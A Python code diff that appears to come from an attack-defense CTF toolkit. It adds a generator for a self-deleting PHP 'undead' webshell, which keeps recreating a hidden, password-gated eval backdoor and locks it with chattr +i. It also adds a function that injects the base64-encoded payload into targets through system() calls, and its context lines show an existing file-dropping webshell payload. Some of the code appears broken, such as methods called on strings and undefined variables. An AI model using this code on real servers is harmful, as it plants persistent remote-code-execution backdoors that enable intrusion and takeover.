@@ -2,15 +2,42 @@ import requests
 import paramiko as sshc
 import time
 import base64
+import hashlib
 from utfc.sshFunc import SSH
-'''
-看起来很随机的2000个8位字符串，可以用来生成文件名或连接key
-'''
-rand8 = []
 
+
+def creat_bsm(pas='00',fn='/var/www/web/.index.php'):
+    bsm='''<?php
+    set_time_limit(0);
+    unlink(__FILE__);
+    $file = '/var/www/web/.insta1l.php';
+    $code = '<?php if(md5($_REQUEST["pass"])=="__pass_md5__"){@eval($_REQUEST[a]);}else{die("flag{".md5(rand())."}");} ?>';
+    while (1) {
+        if (md5(file_get_contents($file)) !== md5($code)) {
+            unlink($file);
+            file_put_contents($file, $code);
+            @system('chattr +i __fn__');
+            @system('chmod 600 __fn__');
+        }
+        usleep(50);
+    }
+    ?>- - OK - -'''.replace("__pass_md5__", hashlib.md5(pas).hexdigest()).replace('__fn__', fn)
+    return bsm,base64.b64encode(bsm.encode()).decode()
 
 
 from threading import Thread
+
+def inj_bsm(self,taglist,key,dat={},path="/var/www/web/",uri='.index.php'):
+    for tagurl in taglist:
+        tag=urlTage(tagurl, key,dat)
+        pl = creat_bsm(hashlib.md5(tagurl).hexdigest(),path+uri)
+        tagurl.post(f'system("echo {pl[1]}|base64 -d > {self.path}.install.php")' )
+        tagurl.get(f'system("echo {pl[1]}|base64 -d > {self.path}.install.php")' )
+        print(url,requests.get(self.url+self.uri).text)
+
+
+
+
 class urlTage:
     url = ""
     key = ""
@@ -101,6 +128,9 @@ class urlTage:
         pl = {
             self.key: f'''$b="{b64s}";$c = base64_decode($b);$f = fopen("{fnd}",'w+');fwrite($f,$c);fclose($f);system("chmod 777 {fnd}");'''}
         requests.post(self.url, data=pl)
+
+
+
 
 
 
